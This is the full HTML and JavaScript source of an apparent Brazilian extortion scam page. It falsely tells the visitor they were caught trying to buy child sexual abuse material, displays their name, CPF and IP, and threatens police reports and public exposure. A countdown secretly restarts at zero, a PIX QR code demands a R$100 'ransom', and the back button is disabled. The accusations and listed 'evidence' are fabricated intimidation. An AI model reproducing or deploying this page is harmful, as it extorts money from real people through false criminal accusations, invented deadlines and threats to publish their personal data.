<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>VOC√ä FOI PEGO NO FLAGRANTE</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    html, body {
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      font-size: 16px;
      line-height: 1.5;
      width: 100%;
      min-height: 100vh;
      overflow-x: hidden;
      padding: 15px;
    }
    
    .container {
      width: 100%;
      max-width: 100%;
      background: #000;
      padding: 15px;
      text-align: center;
      margin: 0 auto;
    }
    
    .main-title {
      font-size: 28px;
      font-weight: bold;
      color: #FF0000;
      margin-bottom: 20px;
      text-transform: uppercase;
      text-align: center;
    }
    
    .intro-text {
      font-size: 20px;
      font-weight: bold;
      color: #ffffff;
      margin-bottom: 20px;
      text-align: center;
    }
    
    .accusation-text {
      font-size: 18px;
      color: #ffffff;
      margin-bottom: 20px;
      text-align: center;
      line-height: 1.6;
    }
    
    .evidence-section {
      background: #1a1a1a;
      padding: 15px;
      border-left: 4px solid #FF0000;
      margin: 20px 0;
      text-align: center;
    }
    
    .evidence-title {
      font-size: 18px;
      font-weight: bold;
      color: #FF0000;
      margin-bottom: 12px;
      text-align: center;
    }
    
    .evidence-list {
      list-style: none;
      padding: 0;
      text-align: center;
    }
    
    .evidence-list li {
      font-size: 15px;
      color: #ffffff;
      margin: 6px 0;
      text-align: center;
    }
    
    .evidence-list li::before {
      content: "‚Ä¢ ";
      color: #FF0000;
      font-weight: bold;
    }
    
    .crime-warning {
      font-size: 20px;
      font-weight: bold;
      color: #FF0000;
      margin: 25px 0;
      text-align: center;
    }
    
    .exposure-warning {
      font-size: 18px;
      color: #ffffff;
      margin: 20px 0;
      text-align: center;
    }
    
    .countdown-section {
      background: #1a1a1a;
      border: 2px solid #FF0000;
      padding: 20px;
      margin: 25px 0;
      text-align: center;
    }
    
    .countdown-label {
      font-size: 18px;
      color: #ffffff;
      margin-bottom: 12px;
      text-align: center;
    }
    
    .countdown {
      font-size: 40px;
      font-weight: bold;
      font-family: 'Courier New', monospace;
      background: #000;
      color: #FF0000;
      padding: 15px 25px;
      border-radius: 5px;
      display: inline-block;
      letter-spacing: 2px;
      text-shadow: 0 0 10px #FF0000;
    }
    
    .countdown-warning {
      font-size: 16px;
      color: #ffffff;
      margin-top: 12px;
      font-style: italic;
      text-align: center;
    }
    
    .qr-section {
      margin: 30px 0;
      text-align: center;
      padding: 20px;
      border: 2px solid #ffff00;
      background: rgba(255, 255, 0, 0.1);
    }
    
    .qr-title {
      font-size: 20px;
      font-weight: bold;
      color: #ffff00;
      margin-bottom: 15px;
    }
    
    .qr-code-container {
      margin: 20px 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .qr-code-image {
      max-width: 200px;
      max-height: 200px;
      border: 2px solid #ffffff;
      background: white;
      padding: 10px;
    }
    
    .pix-code-section {
      margin-top: 20px;
    }
    
    .pix-code-label {
      font-size: 16px;
      color: #ffffff;
      margin-bottom: 10px;
    }
    
    .pix-code {
      font-family: 'Courier New', monospace;
      font-size: 12px;
      color: #ffff00;
      background: rgba(0, 0, 0, 0.5);
      padding: 10px;
      border: 1px solid #cccccc;
      word-break: break-all;
      margin-bottom: 10px;
    }
    
    .loading-qr {
      color: #ffff00;
      font-size: 16px;
      margin: 20px 0;
    }
    
    .error-qr {
      color: #ff0000;
      font-size: 14px;
      margin: 20px 0;
    }
    
    /* Mobile responsiveness */
    @media (max-width: 768px) {
      body {
        font-size: 14px;
        padding: 10px;
      }
      
      .container {
        padding: 10px;
      }
      
      .main-title {
        font-size: 22px;
      }
      
      .intro-text {
        font-size: 16px;
      }
      
      .countdown {
        font-size: 28px;
        padding: 10px 15px;
      }
      
      .pix-info {
        font-size: 18px;
      }
      
      .qr-section {
        margin: 20px 0;
        padding: 15px;
      }
      
      .qr-title {
        font-size: 16px;
      }
      
      .qr-code-image {
        max-width: 150px;
        max-height: 150px;
      }
      
      .pix-code {
        font-size: 10px;
        padding: 8px;
      }
      
      .pix-code-label {
        font-size: 14px;
      }
    }
    
    /* Disable all interactions */
    * {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      -webkit-touch-callout: none;
      -webkit-tap-highlight-color: transparent;
    }
    
    body {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="main-title">
      üö® VOC√ä FOI PEGO NO FLAGRANTE
    </div>
    
    <div class="intro-text">
      <strong><span id="nome-cliente">[CARREGANDO NOME...]</span></strong>,<br>
      a gente rastreou sua tentativa de comprar conte√∫do proibido com menores de idade.
    </div>
    
    <div class="accusation-text">
      Voc√™ acessou isso √†s <strong><span id="hora-tentativa">[CARREGANDO...]</span></strong>, usando o IP <strong><span id="ip-cliente">[CARREGANDO IP...]</span></strong>, e a porra do CPF <strong><span id="cpf-cliente">[CARREGANDO CPF...]</span></strong> t√° amarrado junto.
      <br><br>
      <strong style="color: #FF0000;">E A GENTE GRAVOU TUDO.</strong>
      <br><br>
      <strong>ISSO √â CRIME FEDERAL - ARTIGO 241-A DO ECA</strong><br>
      <strong>PENA: 3 A 6 ANOS DE PRIS√ÉO + MULTA</strong>
    </div>
    
    <div class="evidence-section">
      <div class="evidence-title">PROVAS COLETADAS:</div>
      <ul class="evidence-list">
        <li>Hist√≥rico completo de navega√ß√£o</li>
        <li>Screenshots da tentativa de compra</li>
        <li>Dados do dispositivo e localiza√ß√£o GPS</li>
        <li>Registro de IP com hor√°rio exato</li>
        <li>Dados banc√°rios vinculados ao CPF</li>
      </ul>
    </div>
    
    <div class="crime-warning">
      VOC√ä SER√Å DENUNCIADO √Ä POL√çCIA FEDERAL<br>
      SEUS DADOS V√ÉO PARA O MINIST√âRIO P√öBLICO
    </div>
    
    <div class="exposure-warning">
      Esse caso vai ser publicado em sites de den√∫ncia, grupos de WhatsApp, Facebook e enviado para seus contatos, daqui a:
    </div>
    
    <div class="countdown-section">
      <div class="countdown-label">üïí</div>
      <div class="countdown" id="contador">10:00</div>
      <div class="countdown-warning">
        (esse tempo N√ÉO reinicia, nem se voc√™ sair. Zerou, j√° era.)
      </div>
    </div>
    
    <div class="crime-warning">
      QUANDO O TEMPO ACABAR, TODOS OS SEUS DADOS V√ÉO SER EXPOSTOS:
    </div>
    
    <ul class="evidence-list">
      <li>Seu nome e CPF completo</li>
      <li>Endere√ßo residencial</li>
      <li>Telefone e e-mail</li>
      <li>Fotos das tentativas de compra</li>
      <li>Hist√≥rico de navega√ß√£o</li>
      <li>Associados a crimes cibern√©ticos</li>
    </ul>
    
    <div class="qr-section">
      <div class="qr-title">PIX DE RESGATE - R$ 100,00</div>
      
      <div id="qr-loading" class="loading-qr">
        Gerando QR code PIX...
      </div>
      
      <div id="qr-container" class="qr-code-container" style="display: none;">
        <img id="qr-image" class="qr-code-image" alt="QR Code PIX" />
      </div>
      
      <div id="pix-code-container" class="pix-code-section" style="display: none;">
        <div class="pix-code-label">C√≥digo PIX (Copia e Cola):</div>
        <div id="pix-code" class="pix-code"></div>
        <div style="font-size: 12px; color: #cccccc; margin-top: 10px;">
          Copie o c√≥digo acima ou escaneie o QR code
        </div>
      </div>
      
      <div id="qr-error" class="error-qr" style="display: none;">
        Erro ao gerar QR code. Tente recarregar a p√°gina.
      </div>
    </div>
  </div>

  <script>
    // Capturar dados da URL
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('token');
    
    // Vari√°veis para controle da sess√£o
    let sessionId = null;
    let timerInterval = null;
    
    // Dados padr√£o
    let dadosCliente = {
      nome: 'USU√ÅRIO DETECTADO',
      cpf: 'CPF RASTREADO', 
      ip: 'IP CAPTURADO',
      hora: 'HOR√ÅRIO REGISTRADO'
    };
    
    // Fun√ß√£o para obter hora atual formatada
    function obterHoraAtual() {
      const agora = new Date();
      const horas = agora.getHours().toString().padStart(2, '0');
      const minutos = agora.getMinutes().toString().padStart(2, '0');
      const segundos = agora.getSeconds().toString().padStart(2, '0');
      return `${horas}:${minutos}:${segundos}`;
    }
    
    // Fun√ß√£o para obter IP do usu√°rio
    async function obterIPUsuario() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        return 'IP OCULTO';
      }
    }
    
    // Fun√ß√£o para criar nova sess√£o de timer
    async function criarSessaoTimer() {
      if (!token) {
        console.log('Token n√£o encontrado, usando timer padr√£o');
        iniciarTimerPadrao();
        return;
      }
      
      try {
        const response = await fetch('/api/criar-sessao-timer', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ token: token })
        });
        
        const data = await response.json();
        
        if (data.success) {
          sessionId = data.sessionId;
          console.log('Sess√£o de timer criada:', sessionId);
          iniciarTimerSessao();
        } else {
          console.log('Erro ao criar sess√£o:', data.error);
          iniciarTimerPadrao();
        }
      } catch (error) {
        console.log('Erro na requisi√ß√£o:', error);
        iniciarTimerPadrao();
      }
    }
    
    // Fun√ß√£o para iniciar timer baseado na sess√£o
    function iniciarTimerSessao() {
      if (!sessionId) {
        iniciarTimerPadrao();
        return;
      }
      
      // Atualizar contador baseado na sess√£o
      timerInterval = setInterval(async () => {
        try {
          const response = await fetch(`/api/status-sessao-timer/${sessionId}`);
          const data = await response.json();
          
          if (data.success && data.active) {
            const minutos = Math.floor(data.timeRemaining / 60);
            const segundos = data.timeRemaining % 60;
            const display = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
            document.getElementById('contador').textContent = display;
            
            if (data.timeRemaining <= 0) {
              // Timer expirou, finalizar sess√£o
              await finalizarSessao();
              iniciarNovaContagem();
            }
          } else {
            // Sess√£o n√£o encontrada ou inativa, usar timer padr√£o
            clearInterval(timerInterval);
            iniciarTimerPadrao();
          }
        } catch (error) {
          console.log('Erro ao verificar status da sess√£o:', error);
          // Em caso de erro, continuar com timer padr√£o
          clearInterval(timerInterval);
          iniciarTimerPadrao();
        }
      }, 1000);
    }
    
    // Fun√ß√£o para finalizar sess√£o atual
    async function finalizarSessao() {
      if (!sessionId) return;
      
      try {
        await fetch('/api/finalizar-sessao-timer', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ sessionId: sessionId })
        });
      } catch (error) {
        console.log('Erro ao finalizar sess√£o:', error);
      }
      
      sessionId = null;
    }
    
    // Fun√ß√£o para iniciar nova contagem (criar nova sess√£o)
    function iniciarNovaContagem() {
      if (timerInterval) {
        clearInterval(timerInterval);
      }
      // Aguardar um momento e criar nova sess√£o
      setTimeout(() => {
        criarSessaoTimer();
      }, 1000);
    }
    
    // Fun√ß√£o de fallback para timer padr√£o com persist√™ncia
    function iniciarTimerPadrao() {
      // Verificar se j√° existe um timer salvo no localStorage
      const timerKey = `timer_${token || 'default'}`;
      let tempoInicial = localStorage.getItem(timerKey);
      let tempoRestante;
      
      if (tempoInicial) {
        const tempoDecorrido = Math.floor((Date.now() - parseInt(tempoInicial)) / 1000);
        tempoRestante = Math.max(0, (10 * 60) - tempoDecorrido);
      } else {
        tempoRestante = 10 * 60; // 10 minutos em segundos
        localStorage.setItem(timerKey, Date.now().toString());
      }
      
      if (timerInterval) {
        clearInterval(timerInterval);
      }
      
      timerInterval = setInterval(() => {
        const minutos = Math.floor(tempoRestante / 60);
        const segundos = tempoRestante % 60;
        const display = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
        document.getElementById('contador').textContent = display;
        
        if (tempoRestante > 0) {
          tempoRestante--;
        } else {
          // Quando chegar a zero, criar novo timer
          localStorage.setItem(timerKey, Date.now().toString());
          tempoRestante = 10 * 60;
        }
      }, 1000);
    }
    
    // Inicializar dados na p√°gina
    async function inicializarDados() {
      // Definir hora atual
      dadosCliente.hora = obterHoraAtual();
      document.getElementById('hora-tentativa').textContent = dadosCliente.hora;
      
      // Obter IP do usu√°rio
      const ipUsuario = await obterIPUsuario();
      dadosCliente.ip = ipUsuario;
      document.getElementById('ip-cliente').textContent = dadosCliente.ip;
      
      // Tentar buscar dados reais se token existir
      if (token) {
        try {
          const response = await fetch(`/api/dados-comprador?token=${token}`);
          const data = await response.json();
          
          if (data.success) {
            if (data.nome && data.nome !== 'N/A' && data.nome.trim() !== '') {
              dadosCliente.nome = data.nome.toUpperCase();
              document.getElementById('nome-cliente').textContent = dadosCliente.nome;
            }
            if (data.cpf && data.cpf !== 'N/A' && data.cpf.trim() !== '') {
              dadosCliente.cpf = data.cpf;
              document.getElementById('cpf-cliente').textContent = dadosCliente.cpf;
            }
            if (data.ip && data.ip !== 'N/A' && data.ip.trim() !== '') {
              dadosCliente.ip = data.ip;
              document.getElementById('ip-cliente').textContent = dadosCliente.ip;
            }
          }
        } catch (error) {
          console.log('Usando dados padr√£o detectados');
        }
      }
      
      // Definir dados padr√£o se n√£o carregou
      document.getElementById('nome-cliente').textContent = dadosCliente.nome;
      document.getElementById('cpf-cliente').textContent = dadosCliente.cpf;
      document.getElementById('ip-cliente').textContent = dadosCliente.ip;
    }
    
    // Fun√ß√£o para gerar QR code PIX
    async function gerarQRCodePIX() {
      const loadingElement = document.getElementById('qr-loading');
      const qrContainer = document.getElementById('qr-container');
      const pixCodeContainer = document.getElementById('pix-code-container');
      const errorElement = document.getElementById('qr-error');
      const qrImage = document.getElementById('qr-image');
      const pixCode = document.getElementById('pix-code');
      
      try {
        console.log('Gerando QR code PIX...');
        
        const response = await fetch('/api/gerar-qr-pix', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({})
        });
        
        const data = await response.json();
        
        if (data.success && data.qr_code_base64 && data.pix_copia_cola) {
          // Esconder loading
          loadingElement.style.display = 'none';
          
          // Mostrar QR code
          qrImage.src = data.qr_code_base64;
          qrContainer.style.display = 'flex';
          
          // Mostrar c√≥digo PIX
          pixCode.textContent = data.pix_copia_cola;
          pixCodeContainer.style.display = 'block';
          
          console.log('QR code PIX gerado com sucesso:', data.transacao_id);
        } else {
          throw new Error(data.error || 'Erro desconhecido');
        }
        
      } catch (error) {
        console.error('Erro ao gerar QR code PIX:', error);
        
        // Esconder loading
        loadingElement.style.display = 'none';
        
        // Mostrar erro
        errorElement.style.display = 'block';
        errorElement.textContent = 'Erro ao gerar QR code PIX. Tente recarregar a p√°gina.';
      }
    }
    
    // Inicializar sistema de timer
    criarSessaoTimer();
    
    // Gerar QR code PIX quando a p√°gina carregar
    gerarQRCodePIX();
    
    // Limpar sess√£o quando a p√°gina for fechada
    window.addEventListener('beforeunload', () => {
      if (sessionId) {
        // Usar sendBeacon para enviar requisi√ß√£o mesmo quando a p√°gina est√° sendo fechada
        const formData = new FormData();
        formData.append('sessionId', sessionId);
        navigator.sendBeacon('/api/finalizar-sessao-timer', formData);
      }
    });
    
    // Inicializar dados na p√°gina
    inicializarDados();
    
    // Impedir back/forward
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
  </script>
</body>
</html>